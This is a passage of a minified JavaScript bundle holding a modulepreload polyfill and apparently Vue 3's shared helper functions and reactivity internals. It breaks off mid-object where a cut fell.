(function() {
    const t = document.createElement("link").relList;
    if (t && t.supports && t.supports("modulepreload")) return;
    for (const s of document.querySelectorAll('link[rel="modulepreload"]')) r(s);
    new MutationObserver(s => {
        for (const i of s)
            if (i.type === "childList")
                for (const o of i.addedNodes) o.tagName === "LINK" && o.rel === "modulepreload" && r(o)
    }).observe(document, {
        childList: !0,
        subtree: !0
    });

    function n(s) {
        const i = {};
        return s.integrity && (i.integrity = s.integrity), s.referrerPolicy && (i.referrerPolicy = s.referrerPolicy), s.crossOrigin === "use-credentials" ? i.credentials = "include" : s.crossOrigin === "anonymous" ? i.credentials = "omit" : i.credentials = "same-origin", i
    }

    function r(s) {
        if (s.ep) return;
        s.ep = !0;
        const i = n(s);
        fetch(s.href, i)
    }
})();

function je(e) {
    const t = Object.create(null);
    for (const n of e.split(",")) t[n] = 1;
    return n => n in t
}
const ue = {},
    Vr = [],
    He = () => {},
    $r = () => !1,
    vr = e => e.charCodeAt(0) === 111 && e.charCodeAt(1) === 110 && (e.charCodeAt(2) > 122 || e.charCodeAt(2) < 97),
    Tc = e => e.startsWith("onUpdate:"),
    ae = Object.assign,
    Sc = (e, t) => {
        const n = e.indexOf(t);
        n > -1 && e.splice(n, 1)
    },
    qx = Object.prototype.hasOwnProperty,
    pe = (e, t) => qx.call(e, t),
    K = Array.isArray,
    Hr = e => us(e) === "[object Map]",
    Tr = e => us(e) === "[object Set]",
    mu = e => us(e) === "[object Date]",
    $p = e => us(e) === "[object RegExp]",
    te = e => typeof e == "function",
    re = e => typeof e == "string",
    ft = e => typeof e == "symbol",
    me = e => e !== null && typeof e == "object",
    Cc = e => (me(e) || te(e)) && te(e.then) && te(e.catch),
    C0 = Object.prototype.toString,
    us = e => C0.call(e),
    Dp = e => us(e).slice(8, -1),
    Ro = e => us(e) === "[object Object]",
    Mo = e => re(e) && e !== "NaN" && e[0] !== "-" && "" + parseInt(e, 10) === e,
    Bn = je(",key,ref,ref_for,ref_key,onVnodeBeforeMount,onVnodeMounted,onVnodeBeforeUpdate,onVnodeUpdated,onVnodeBeforeUnmount,onVnodeUnmounted"),
    Fp = je("bind,cloak,else-if,else,for,html,if,model,on,once,pre,show,slot,text,memo"),
    Ic = e => {
        const t = Object.create(null);
        return (n => t[n] || (t[n] = e(n)))
    },
    Gx = /-\w/g,
    _e = Ic(e => e.replace(Gx, t => t.slice(1).toUpperCase())),
    Wx = /\B([A-Z])/g,
    nt = Ic(e => e.replace(Wx, "-$1").toLowerCase()),
    Sr = Ic(e => e.charAt(0).toUpperCase() + e.slice(1)),
    jr = Ic(e => e ? `on${Sr(e)}` : ""),
    et = (e, t) => !Object.is(e, t),
    zr = (e, ...t) => {
        for (let n = 0; n < e.length; n++) e[n](...t)
    },
    I0 = (e, t, n, r = !1) => {
        Object.defineProperty(e, t, {
            configurable: !0,
            enumerable: !1,
            writable: r,
            value: n
        })
    },
    ko = e => {
        const t = parseFloat(e);
        return isNaN(t) ? e : t
    },
    ji = e => {
        const t = re(e) ? Number(e) : NaN;
        return isNaN(t) ? e : t
    };
let Ad;
const Bo = () => Ad || (Ad = typeof globalThis < "u" ? globalThis : typeof self < "u" ? self : typeof window < "u" ? window : typeof global < "u" ? global : {}),
    Xx = /^[_$a-zA-Z\xA0-\uFFFF][_$a-zA-Z0-9\xA0-\uFFFF]*$/;

function Kx(e) {
    return Xx.test(e) ? `__props.${e}` : `__props[${JSON.stringify(e)}]`
}

function Zx(e, t) {
    return e + JSON.stringify(t, (n, r) => typeof r == "function" ? r.toString() : r)
}
const Yx = {
        TEXT: 1,
        1: "TEXT",
        CLASS: 2,
        2: "CLASS",
        STYLE: 4,
        4: "STYLE",
        PROPS: 8,
        8: "PROPS",
        FULL_PROPS: 16,
        16: "FULL_PROPS",
        NEED_HYDRATION: 32,
        32: "NEED_HYDRATION",
        STABLE_FRAGMENT: 64,
        64: "STABLE_FRAGMENT",
        KEYED_FRAGMENT: 128,
        128: "KEYED_FRAGMENT",
        UNKEYED_FRAGMENT: 256,
        256: "UNKEYED_FRAGMENT",
        NEED_PATCH: 512,
        512: "NEED_PATCH",
        DYNAMIC_SLOTS: 1024,
        1024: "DYNAMIC_SLOTS",
        DEV_ROOT_FRAGMENT: 2048,
        2048: "DEV_ROOT_FRAGMENT",
        CACHED: -1,
        "-1": "CACHED",
        BAIL: -2,
        "-2": "BAIL"
    },
    Jx = {
        1: "TEXT",
        2: "CLASS",
        4: "STYLE",
        8: "PROPS",
        16: "FULL_PROPS",
        32: "NEED_HYDRATION",
        64: "STABLE_FRAGMENT",
        128: "KEYED_FRAGMENT",
        256: "UNKEYED_FRAGMENT",
        512: "NEED_PATCH",
        1024: "DYNAMIC_SLOTS",
        2048: "DEV_ROOT_FRAGMENT",
        [-1]: "CACHED",
        [-2]: "BAIL"
    },
    Qx = {
        ELEMENT: 1,
        1: "ELEMENT",
        FUNCTIONAL_COMPONENT: 2,
        2: "FUNCTIONAL_COMPONENT",
        STATEFUL_COMPONENT: 4,
        4: "STATEFUL_COMPONENT",
        TEXT_CHILDREN: 8,
        8: "TEXT_CHILDREN",
        ARRAY_CHILDREN: 16,
        16: "ARRAY_CHILDREN",
        SLOTS_CHILDREN: 32,
        32: "SLOTS_CHILDREN",
        TELEPORT: 64,
        64: "TELEPORT",
        SUSPENSE: 128,
        128: "SUSPENSE",
        COMPONENT_SHOULD_KEEP_ALIVE: 256,
        256: "COMPONENT_SHOULD_KEEP_ALIVE",
        COMPONENT_KEPT_ALIVE: 512,
        512: "COMPONENT_KEPT_ALIVE",
        COMPONENT: 6,
        6: "COMPONENT"
    },
    ey = {
        STABLE: 1,
        1: "STABLE",
        DYNAMIC: 2,
        2: "DYNAMIC",
        FORWARDED: 3,
        3: "FORWARDED"
    },
    ty = {
        1: "STABLE",
        2: "DYNAMIC",
        3: "FORWARDED"
    },
    ny = "Infinity,undefined,NaN,isFinite,isNaN,parseFloat,parseInt,decodeURI,decodeURIComponent,encodeURI,encodeURIComponent,Math,Number,Date,Array,Object,Boolean,String,RegExp,Map,Set,JSON,Intl,BigInt,console,Error,Symbol",
    A0 = je(ny),
    ry = A0,
    Nd = 2;

function Up(e, t = 0, n = e.length) {
    if (t = Math.max(0, Math.min(t, e.length)), n = Math.max(0, Math.min(n, e.length)), t > n) return "";
    let r = e.split(/(\r?\n)/);
    const s = r.filter((a, c) => c % 2 === 1);
    r = r.filter((a, c) => c % 2 === 0);
    let i = 0;
    const o = [];
    for (let a = 0; a < r.length; a++)
        if (i += r[a].length + (s[a] && s[a].length || 0), i >= t) {
            for (let c = a - Nd; c <= a + Nd || n > i; c++) {
                if (c < 0 || c >= r.length) continue;
                const u = c + 1;
                o.push(`${u}${" ".repeat(Math.max(3-String(u).length,0))}|  ${r[c]}`);
                const l = r[c].length,
                    f = s[c] && s[c].length || 0;
                if (c === a) {
                    const d = t - (i - (l + f)),
                        h = Math.max(1, n > i ? l - d : n - t);
                    o.push("   |  " + " ".repeat(d) + "^".repeat(h))
                } else if (c > a) {
                    if (n > i) {
                        const d = Math.max(Math.min(n - i, l), 1);
                        o.push("   |  " + "^".repeat(d))
                    }
                    i += l + f
                }
            }
            break
        } return o.join(`
`)
}

function ii(e) {
    if (K(e)) {
        const t = {};
        for (let n = 0; n < e.length; n++) {
            const r = e[n],
                s = re(r) ? N0(r) : ii(r);
            if (s)
                for (const i in s) t[i] = s[i]
        }
        return t
    } else if (re(e) || me(e)) return e
}
const sy = /;(?![^(]*\))/g,
    iy = /:([^]+)/,
    oy = /\/\*[^]*?\*\//g;

function N0(e) {
    const t = {};
    return e.replace(oy, "").split(sy).forEach(n => {
        if (n) {
            const r = n.split(iy);
            r.length > 1 && (t[r[0].trim()] = r[1].trim())
        }
    }), t
}

function ay(e) {
    if (!e) return "";
    if (re(e)) return e;
    let t = "";
    for (const n in e) {
        const r = e[n];
        if (re(r) || typeof r == "number") {
            const s = n.startsWith("--") ? n : nt(n);
            t += `${s}:${r};`
        }
    }
    return t
}

function fs(e) {
    let t = "";
    if (re(e)) t = e;
    else if (K(e))
        for (let n = 0; n < e.length; n++) {
            const r = fs(e[n]);
            r && (t += r + " ")
        } else if (me(e))
            for (const n in e) e[n] && (t += n + " ");
    return t.trim()
}

function Vp(e) {
    if (!e) return null;
    let {
        class: t,
        style: n
    } = e;
    return t && !re(t) && (e.class = fs(t)), n && (e.style = ii(n)), e
}
const cy = "html,body,base,head,link,meta,style,title,address,article,aside,footer,header,hgroup,h1,h2,h3,h4,h5,h6,nav,section,div,dd,dl,dt,figcaption,figure,picture,hr,img,li,main,ol,p,pre,ul,a,b,abbr,bdi,bdo,br,cite,code,data,dfn,em,i,kbd,mark,q,rp,rt,ruby,s,samp,small,span,strong,sub,sup,time,u,var,wbr,area,audio,map,track,video,embed,object,param,source,canvas,script,noscript,del,ins,caption,col,colgroup,table,thead,tbody,td,th,tr,button,datalist,fieldset,form,input,label,legend,meter,optgroup,option,output,progress,select,textarea,details,dialog,menu,summary,template,blockquote,iframe,tfoot",
    ly = "svg,animate,animateMotion,animateTransform,circle,clipPath,color-profile,defs,desc,discard,ellipse,feBlend,feColorMatrix,feComponentTransfer,feComposite,feConvolveMatrix,feDiffuseLighting,feDisplacementMap,feDistantLight,feDropShadow,feFlood,feFuncA,feFuncB,feFuncG,feFuncR,feGaussianBlur,feImage,feMerge,feMergeNode,feMorphology,feOffset,fePointLight,feSpecularLighting,feSpotLight,feTile,feTurbulence,filter,foreignObject,g,hatch,hatchpath,image,line,linearGradient,marker,mask,mesh,meshgradient,meshpatch,meshrow,metadata,mpath,path,pattern,polygon,polyline,radialGradient,rect,set,solidcolor,stop,switch,symbol,text,textPath,title,tspan,unknown,use,view",
    uy = "annotation,annotation-xml,maction,maligngroup,malignmark,math,menclose,merror,mfenced,mfrac,mfraction,mglyph,mi,mlabeledtr,mlongdiv,mmultiscripts,mn,mo,mover,mpadded,mphantom,mprescripts,mroot,mrow,ms,mscarries,mscarry,msgroup,msline,mspace,msqrt,msrow,mstack,mstyle,msub,msubsup,msup,mtable,mtd,mtext,mtr,munder,munderover,none,semantics",
    fy = "area,base,br,col,embed,hr,img,input,link,meta,param,source,track,wbr",
    Hp = je(cy),
    jp = je(ly),
    zp = je(uy),
    qp = je(fy),
    Gp = "itemscope,allowfullscreen,formnovalidate,ismap,nomodule,novalidate,readonly",
    Wp = je(Gp),
    dy = je(Gp + ",async,autofocus,autoplay,controls,default,defer,disabled,hidden,inert,loop,open,required,reversed,scoped,seamless,checked,muted,multiple,selected");

function P0(e) {
    return !!e || e === ""
}
const hy = /[>/="'\u0009\u000a\u000c\u0020]/,
    Nl = {};

function py(e) {
    if (Nl.hasOwnProperty(e)) return Nl[e];
    const t = hy.test(e);
    return t && console.error(`unsafe attribute name: ${e}`), Nl[e] = !t
}
const my = {
        acceptCharset: "accept-charset",
        className: "class",
        htmlFor: "for",
        httpEquiv: "http-equiv"
    },
    by = je("accept,accept-charset,accesskey,action,align,allow,alt,async,autocapitalize,autocomplete,autofocus,autoplay,background,bgcolor,border,buffered,capture,challenge,charset,checked,cite,class,code,codebase,color,cols,colspan,content,contenteditable,contextmenu,controls,coords,crossorigin,csp,data,datetime,decoding,default,defer,dir,dirname,disabled,download,draggable,dropzone,enctype,enterkeyhint,for,form,formaction,formenctype,formmethod,formnovalidate,formtarget,headers,height,hidden,high,href,hreflang,http-equiv,icon,id,importance,inert,integrity,ismap,itemprop,keytype,kind,label,lang,language,loading,list,loop,low,manifest,max,maxlength,minlength,media,min,multiple,muted,name,novalidate,open,optimum,pattern,ping,placeholder,poster,preload,radiogroup,readonly,referrerpolicy,rel,required,reversed,rows,rowspan,sandbox,scope,scoped,selected,shape,size,sizes,slot,span,spellcheck,src,srcdoc,srclang,srcset,start,step,style,summary,tabindex,target,title,translate,type,usemap,value,width,wrap"),
    gy = je("xmlns,accent-height,accumulate,additive,alignment-baseline,alphabetic,amplitude,arabic-form,ascent,attributeName,attributeType,azimuth,baseFrequency,baseline-shift,baseProfile,bbox,begin,bias,by,calcMode,cap-height,class,clip,clipPathUnits,clip-path,clip-rule,color,color-interpolation,color-interpolation-filters,color-profile,color-rendering,contentScriptType,contentStyleType,crossorigin,cursor,cx,cy,d,decelerate,descent,diffuseConstant,direction,display,divisor,dominant-baseline,dur,dx,dy,edgeMode,elevation,enable-background,end,exponent,fill,fill-opacity,fill-rule,filter,filterRes,filterUnits,flood-color,flood-opacity,font-family,font-size,font-size-adjust,font-stretch,font-style,font-variant,font-weight,format,from,fr,fx,fy,g1,g2,glyph-name,glyph-orientation-horizontal,glyph-orientation-vertical,glyphRef,gradientTransform,gradientUnits,hanging,height,href,hreflang,horiz-adv-x,horiz-origin-x,id,ideographic,image-rendering,in,in2,intercept,k,k1,k2,k3,k4,kernelMatrix,kernelUnitLength,kerning,keyPoints,keySplines,keyTimes,lang,lengthAdjust,letter-spacing,lighting-color,limitingConeAngle,local,marker-end,marker-mid,marker-start,markerHeight,markerUnits,markerWidth,mask,maskContentUnits,maskUnits,mathematical,max,media,method,min,mode,name,numOctaves,offset,opacity,operator,order,orient,orientation,origin,overflow,overline-position,overline-thickness,panose-1,paint-order,path,pathLength,patternContentUnits,patternTransform,patternUnits,ping,pointer-events,points,pointsAtX,pointsAtY,pointsAtZ,preserveAlpha,preserveAspectRatio,primitiveUnits,r,radius,referrerPolicy,refX,refY,rel,rendering-intent,repeatCount,repeatDur,requiredExtensions,requiredFeatures,restart,result,rotate,rx,ry,scale,seed,shape-rendering,slope,spacing,specularConstant,specularExponent,speed,spreadMethod,startOffset,stdDeviation,stemh,stemv,stitchTiles,stop-color,stop-opacity,strikethrough-position,strikethrough-thickness,string,stroke,stroke-dasharray,stroke-dashoffset,stroke-linecap,stroke-linejoin,stroke-miterlimit,stroke-opacity,stroke-width,style,surfaceScale,systemLanguage,tabindex,tableValues,target,targetX,targetY,text-anchor,text-decoration,text-rendering,textLength,to,transform,transform-origin,type,u1,u2,underline-position,underline-thickness,unicode,unicode-bidi,unicode-range,units-per-em,v-alphabetic,v-hanging,v-ideographic,v-mathematical,values,vector-effect,version,vert-adv-y,vert-origin-x,vert-origin-y,viewBox,viewTarget,visibility,width,widths,word-spacing,writing-mode,x,x-height,x1,x2,xChannelSelector,xlink:actuate,xlink:arcrole,xlink:href,xlink:role,xlink:show,xlink:title,xlink:type,xmlns:xlink,xml:base,xml:lang,xml:space,y,y1,y2,yChannelSelector,z,zoomAndPan"),
    xy = je("accent,accentunder,actiontype,align,alignmentscope,altimg,altimg-height,altimg-valign,altimg-width,alttext,bevelled,close,columnsalign,columnlines,columnspan,denomalign,depth,dir,display,displaystyle,encoding,equalcolumns,equalrows,fence,fontstyle,fontweight,form,frame,framespacing,groupalign,height,href,id,indentalign,indentalignfirst,indentalignlast,indentshift,indentshiftfirst,indentshiftlast,indextype,justify,largetop,largeop,lquote,lspace,mathbackground,mathcolor,mathsize,mathvariant,maxsize,minlabelspacing,mode,other,overflow,position,rowalign,rowlines,rowspan,rquote,rspace,scriptlevel,scriptminsize,scriptsizemultiplier,selection,separator,separators,shift,side,src,stackalign,stretchy,subscriptshift,superscriptshift,symmetric,voffset,width,widths,xlink:href,xlink:show,xlink:type,xmlns");

function yy(e) {
    if (e == null) return !1;
    const t = typeof e;
    return t === "string" || t === "number" || t === "boolean"
}
const wy = /["'&<>]/;

function _y(e) {
    const t = "" + e,
        n = wy.exec(t);
    if (!n) return t;
    let r = "",
        s, i, o = 0;
    for (i = n.index; i < t.length; i++) {
        switch (t.charCodeAt(i)) {
            case 34:
                s = "&quot;";
                break;
            case 38:
                s = "&amp;";
                break;
            case 39:
                s = "&#39;";
                break;
            case 60:
                s = "&lt;";
                break;
            case 62:
                s = "&gt;";
                break;
            default:
                continue
        }
        o !== i && (r += t.slice(o, i)), o = i + 1, r += s
    }
    return o !== i ? r + t.slice(o, i) : r
}
const Ey = /^-?>|<!--|-->|--!>|<!-$/g;

function vy(e) {
    return e.replace(Ey, "")
}
const Xp = /[ !"#$%&'()*+,./:;<=>?@[\\\]^`{|}~]/g;

function Ty(e, t) {
    return e.replace(Xp, n => t ? n === '"' ? '\\\\\\"' : `\\\\${n}` : `\\${n}`)
}

function Sy(e, t) {
    if (e.length !== t.length) return !1;
    let n = !0;
    for (let r = 0; n && r < e.length; r++) n = Hn(e[r], t[r]);
    return n
}

function Hn(e, t) {
    if (e === t) return !0;
    let n = mu(e),
        r = mu(t);
    if (n || r) return n && r ? e.getTime() === t.getTime() : !1;
    if (n = ft(e), r = ft(t), n || r) return e === t;
    if (n = K(e), r = K(t), n || r) return n && r ? Sy(e, t) : !1;
    if (n = me(e), r = me(t), n || r) {
        if (!n || !r) return !1;
        const s = Object.keys(e).length,
            i = Object.keys(t).length;
        if (s !== i) return !1;
        for (const o in e) {
            const a = e.hasOwnProperty(o),
                c = t.hasOwnProperty(o);
            if (a && !c || !a && c || !Hn(e[o], t[o])) return !1
        }
    }
    return String(e) === String(t)
}

function Lo(e, t) {
    return e.findIndex(n => Hn(n, t))
}
const Kp = e => !!(e && e.__v_isRef === !0),
    Fe = e => re(e) ? e : e == null ? "" : K(e) || me(e) && (e.toString === C0 || !te(e.toString)) ? Kp(e) ? Fe(e.value) : JSON.stringify(e, Zp, 2) : String(e),
    Zp = (e, t) => Kp(t) ? Zp(e, t.value) : Hr(t) ? {
        [`Map(${t.size})`]: [...t.entries()].reduce((n, [r, s], i) => (n[Pl(r, i) + " =>"] = s, n), {})
    } : Tr(t) ? {
        [`Set(${t.size})`]: [...t.values()].map(n => Pl(n))
    } : ft(t) ? Pl(t) : me(t) && !K(t) && !Ro(t) ? String(t) : t,
    Pl = (e, t = "") => {
        var n;
        return ft(e) ? `Symbol(${(n=e.description)!=null?n:t})` : e
    };

function Yp(e) {
    return e == null ? "initial" : typeof e == "string" ? e === "" ? " " : e : String(e)
}
const Cy = Object.freeze(Object.defineProperty({
    __proto__: null,
    EMPTY_ARR: Vr,
    EMPTY_OBJ: ue,
    NO: $r,
    NOOP: He,
    PatchFlagNames: Jx,
    PatchFlags: Yx,
    ShapeFlags: Qx,
    SlotFlags: ey,
    camelize: _e,
    capitalize: Sr,
    cssVarNameEscapeSymbolsRE: Xp,
    def: I0,
    escapeHtml: _y,
    escapeHtmlComment: vy,
    extend: ae,
    genCacheKey: Zx,
    genPropsAccessExp: Kx,
    generateCodeFrame: Up,
    getEscapedCssVarName: Ty,
    getGlobalThis: Bo,
    hasChanged: et,
    hasOwn: pe,
    hyphenate: nt,
    includeBooleanAttr: P0,
    invokeArrayFns: zr,
    isArray: K,
    isBooleanAttr: dy,
    isBuiltInDirective: Fp,
    isDate: mu,
    isFunction: te,
    isGloballyAllowed: A0,
    isGloballyWhitelisted: ry,
    isHTMLTag: Hp,
    isIntegerKey: Mo,
    isKnownHtmlAttr: by,
    isKnownMathMLAttr: xy,
    isKnownSvgAttr: gy,
    isMap: Hr,
    isMathMLTag: zp,
    isModelListener: Tc,
    isObject: me,
    isOn: vr,
    isPlainObject: Ro,
    isPromise: Cc,
    isRegExp: $p,
    isRenderableAttrValue: yy,
    isReservedProp: Bn,
    isSSRSafeAttrName: py,
    isSVGTag: jp,
    isSet: Tr,
    isSpecialBooleanAttr: Wp,
    isString: re,
    isSymbol: ft,
    isVoidTag: qp,
    looseEqual: Hn,
    looseIndexOf: Lo,
    looseToNumber: ko,
    makeMap: je,
    normalizeClass: fs,
    normalizeCssVarValue: Yp,
    normalizeProps: Vp,
    normalizeStyle: ii,
    objectToString: C0,
    parseStringStyle: N0,
    propsToAttrMap: my,
    remove: Sc,
    slotFlagsText: ty,
    stringifyStyle: ay,
    toDisplayString: Fe,
    toHandlerKey: jr,
    toNumber: ji,
    toRawType: Dp,
    toTypeString: us
}, Symbol.toStringTag, {
    value: "Module"
}));
let Je;
class O0 {
    constructor(t = !1) {
        this.detached = t, this._active = !0, this._on = 0, this.effects = [], this.cleanups = [], this._isPaused = !1, this.parent = Je, !t && Je && (this.index = (Je.scopes || (Je.scopes = [])).push(this) - 1)
    }
    get active() {
        return this._active
    }
    pause() {
        if (this._active) {
            this._isPaused = !0;
            let t, n;
            if (this.scopes)
                for (t = 0, n = this.scopes.length; t < n; t++) this.scopes[t].pause();
            for (t = 0, n = this.effects.length; t < n; t++) this.effects[t].pause()
        }
    }
    resume() {
        if (this._active && this._isPaused) {
            this._isPaused = !1;
            let t, n;
            if (this.scopes)
                for (t = 0, n = this.scopes.length; t < n; t++) this.scopes[t].resume();
            for (t = 0, n = this.effects.length; t < n; t++) this.effects[t].resume()
        }
    }
    run(t) {
        if (this._active) {
            const n = Je;
            try {
                return Je = this, t()
            } finally {
                Je = n
            }
        }
    }
    on() {
        ++this._on === 1 && (this.prevScope = Je, Je = this)
    }
    off() {
        this._on > 0 && --this._on === 0 && (Je = this.prevScope, this.prevScope = void 0)
    }
    stop(t) {
        if (this._active) {
            this._active = !1;
            let n, r;
            for (n = 0, r = this.effects.length; n < r; n++) this.effects[n].stop();
            for (this.effects.length = 0, n = 0, r = this.cleanups.length; n < r; n++) this.cleanups[n]();
            if (this.cleanups.length = 0, this.scopes) {
                for (n = 0, r = this.scopes.length; n < r; n++) this.scopes[n].stop(!0);
                this.scopes.length = 0
            }
            if (!this.detached && this.parent && !t) {
                const s = this.parent.scopes.pop();
                s && s !== this && (this.parent.scopes[this.index] = s, s.index = this.index)
            }
            this.parent = void 0
        }
    }
}

function Iy(e) {
    return new O0(e)
}

function Jp() {
    return Je
}

function Ay(e, t = !1) {
    Je && Je.cleanups.push(e)
}
let we;
const Ol = new WeakSet;
class zi {
    constructor(t) {
        this.fn = t, this.deps = void 0, this.depsTail = void 0, this.flags = 5, this.next = void 0, this.cleanup = void 0, this.scheduler = void 0, Je && Je.active && Je.effects.push(this)
    }
    pause() {
        this.flags |= 64
    }
    resume() {
        this.flags & 64 && (this.flags &= -65, Ol.has(this) && (Ol.delete(this), this.trigger()))
    }
    notify() {
        this.flags & 2 && !(this.flags & 32) || this.flags & 8 || e1(this)
    }
    run() {
        if (!(this.flags & 1)) return this.fn();
        this.flags |= 2, Pd(this), t1(this);
        const t = we,
            n = Zt;
        we = this, Zt = !0;
        try {
            return this.fn()
        } finally {
            n1(this), we = t, Zt = n, this.flags &= -3
        }
    }
    stop() {
        if (this.flags & 1) {
            for (let t = this.deps; t; t = t.nextDep) k0(t);
            this.deps = this.depsTail = void 0, Pd(this), this.onStop && this.onStop(), this.flags &= -2
        }
    }
    trigger() {
        this.flags & 64 ? Ol.add(this) : this.scheduler ? this.scheduler() : this.runIfDirty()
    }
    runIfDirty() {
        bu(this) && this.run()
    }
    get dirty() {
        return bu(this)
    }
}
let Qp = 0,
    ki, Bi;

function e1(e, t = !1) {
    if (e.flags |= 8, t) {
        e.next = Bi, Bi = e;
        return
    }
    e.next = ki, ki = e
}

function R0() {
    Qp++
}

function M0() {
    if (--Qp > 0) return;
    if (Bi) {
        let t = Bi;
        for (Bi = void 0; t;) {
            const n = t.next;
            t.next = void 0, t.flags &= -9, t = n
        }
    }
    let e;
    for (; ki;) {
        let t = ki;
        for (ki = void 0; t;) {
            const n = t.next;
            if (t.next = void 0, t.flags &= -9, t.flags & 1) try {
                t.trigger()
            } catch (r) {
                e || (e = r)
            }
            t = n
        }
    }
    if (e) throw e
}

function t1(e) {
    for (let t = e.deps; t; t = t.nextDep) t.version = -1, t.prevActiveLink = t.dep.activeLink, t.dep.activeLink = t
}

function n1(e) {
    let t, n = e.depsTail,
        r = n;
    for (; r;) {
        const s = r.prevDep;
        r.version === -1 ? (r === n && (n = s), k0(r), Ny(r)) : t = r, r.dep.activeLink = r.prevActiveLink, r.prevActiveLink = void 0, r = s
    }
    e.deps = t, e.depsTail = n
}

function bu(e) {
    for (let t = e.deps; t; t = t.nextDep)
        if (t.dep.version !== t.version || t.dep.computed && (r1(t.dep.computed) || t.dep.version !== t.version)) return !0;
    return !!e._dirty
}

function r1(e) {
    if (e.flags & 4 && !(e.flags & 16) || (e.flags &= -17, e.globalVersion === qi) || (e.globalVersion = qi, !e.isSSR && e.flags & 128 && (!e.deps && !e._dirty || !bu(e)))) return;
    e.flags |= 2;
    const t = e.dep,
        n = we,
        r = Zt;
    we = e, Zt = !0;
    try {
        t1(e);
        const s = e.fn(e._value);
        (t.version === 0 || et(s, e._value)) && (e.flags |= 128, e._value = s, t.version++)
    } catch (s) {
        throw t.version++, s
    } finally {
        we = n, Zt = r, n1(e), e.flags &= -3
    }
}

function k0(e, t = !1) {
    const {
        dep: n,
        prevSub: r,
        nextSub: s
    } = e;
    if (r && (r.nextSub = s, e.prevSub = void 0), s && (s.prevSub = r, e.nextSub = void 0), n.subs === e && (n.subs = r, !r && n.computed)) {
        n.computed.flags &= -5;
        for (let i = n.computed.deps; i; i = i.nextDep) k0(i, !0)
    }!t && !--n.sc && n.map && n.map.delete(n.key)
}

function Ny(e) {
    const {
        prevDep: t,
        nextDep: n
    } = e;
    t && (t.nextDep = n, e.prevDep = void 0), n && (n.prevDep = t, e.nextDep = void 0)
}

function Py(e, t) {
    e.effect instanceof zi && (e = e.effect.fn);
    const n = new zi(e);
    t && ae(n, t);
    try {
        n.run()
    } catch (s) {
        throw n.stop(), s
    }
    const r = n.run.bind(n);
    return r.effect = n, r
}

function Oy(e) {
    e.effect.stop()
}
let Zt = !0;
const s1 = [];

function jn() {
    s1.push(Zt), Zt = !1
}

function zn() {
    const e = s1.pop();
    Zt = e === void 0 ? !0 : e
}

function Pd(e) {
    const {
        cleanup: t
    } = e;
    if (e.cleanup = void 0, t) {
        const n = we;
        we = void 0;
        try {
            t()
        } finally {
            we = n
        }
    }
}
let qi = 0;
class Ry {
    constructor(t, n) {
        this.sub = t, this.dep = n, this.version = n.version, this.nextDep = this.prevDep = this.nextSub = this.prevSub = this.prevActiveLink = void 0
    }
}
class Ac {
    constructor(t) {
        this.computed = t, this.version = 0, this.activeLink = void 0, this.subs = void 0, this.map = void 0, this.key = void 0, this.sc = 0, this.__v_skip = !0
    }
    track(t) {
        if (!we || !Zt || we === this.computed) return;
        let n = this.activeLink;
        if (n === void 0 || n.sub !== we) n = this.activeLink = new Ry(we, this), we.deps ? (n.prevDep = we.depsTail, we.depsTail.nextDep = n, we.depsTail = n) : we.deps = we.depsTail = n, i1(n);
        else if (n.version === -1 && (n.version = this.version, n.nextDep)) {
            const r = n.nextDep;
            r.prevDep = n.prevDep, n.prevDep && (n.prevDep.nextDep = r), n.prevDep = we.depsTail, n.nextDep = void 0, we.depsTail.nextDep = n, we.depsTail = n, we.deps === n && (we.deps = r)
        }
        return n
    }
    trigger(t) {
        this.version++, qi++, this.notify(t)
    }
    notify(t) {
        R0();
        try {
            for (let n = this.subs; n; n = n.prevSub) n.sub.notify() && n.sub.dep.notify()
        } finally {
            M0()
        }
    }
}

function i1(e) {
    if (e.dep.sc++, e.sub.flags & 4) {
        const t = e.dep.computed;
        if (t && !e.dep.subs) {
            t.flags |= 20;
            for (let r = t.deps; r; r = r.nextDep) i1(r)
        }
        const n = e.dep.subs;
        n !== e && (e.prevSub = n, n && (n.nextSub = e)), e.dep.subs = e
    }
}
const Ua = new WeakMap,
    qr = Symbol(""),
    gu = Symbol(""),
    Gi = Symbol("");

function tt(e, t, n) {
    if (Zt && we) {
        let r = Ua.get(e);
        r || Ua.set(e, r = new Map);
        let s = r.get(n);
        s || (r.set(n, s = new Ac), s.map = r, s.key = n), s.track()
    }
}

function On(e, t, n, r, s, i) {
    const o = Ua.get(e);
    if (!o) {
        qi++;
        return
    }
    const a = c => {
        c && c.trigger()
    };
    if (R0(), t === "clear") o.forEach(a);
    else {
        const c = K(e),
            u = c && Mo(n);
        if (c && n === "length") {
            const l = Number(r);
            o.forEach((f, d) => {
                (d === "length" || d === Gi || !ft(d) && d >= l) && a(f)
            })
        } else switch ((n !== void 0 || o.has(void 0)) && a(o.get(n)), u && a(o.get(Gi)), t) {
            case "add":
                c ? u && a(o.get("length")) : (a(o.get(qr)), Hr(e) && a(o.get(gu)));
                break;
            case "delete":
                c || (a(o.get(qr)), Hr(e) && a(o.get(gu)));
                break;
            case "set":
                Hr(e) && a(o.get(qr));
                break
        }
    }
    M0()
}

function My(e, t) {
    const n = Ua.get(e);
    return n && n.get(t)
}

function bs(e) {
    const t = he(e);
    return t === e ? t : (tt(t, "iterate", Gi), _t(e) ? t : t.map(Yt))
}

function Nc(e) {
    return tt(e = he(e), "iterate", Gi), e
}

function cr(e, t) {
    return pn(e) ? Ln(e) ? Fs(Yt(t)) : Fs(t) : Yt(t)
}
const ky = {
    __proto__: null,
    [Symbol.iterator]() {
        return Rl(this, Symbol.iterator, e => cr(this, e))
    },
    concat(...e) {
        return bs(this).concat(...e.map(t => K(t) ? bs(t) : t))
    },
    entries() {
        return Rl(this, "entries", e => (e[1] = cr(this, e[1]), e))
    },
    every(e, t) {
        return _n(this, "every", e, t, void 0, arguments)
    },
    filter(e, t) {
        return _n(this, "filter", e, t, n => n.map(r => cr(this, r)), arguments)
    },
    find(e, t) {
        return _n(this, "find", e, t, n => cr(this, n), arguments)
    },
    findIndex(e, t) {
        return _n(this, "findIndex", e, t, void 0, arguments)
    },
    findLast(e, t) {
        return _n(this, "findLast", e, t, n => cr(this, n), arguments)
    },
    findLastIndex(e, t) {
        return _n(this, "findLastIndex", e, t, void 0, arguments)
    },
    forEach(e, t) {
        return _n(this, "forEach", e, t, void 0, arguments)
    },
    includes(...e) {
        return Ml(this, "includes", e)
    },
    indexOf(...e) {
        return Ml(this, "indexOf", e)
    },
    join(e) {
        return bs(this).join(e)
    },
    lastIndexOf(...e) {
        return Ml(this, "lastIndexOf", e)
    },
    map(e, t) {
        return _n(this, "map", e, t, void 0, arguments)
    },
    pop() {
        return yi(this, "pop")
    },
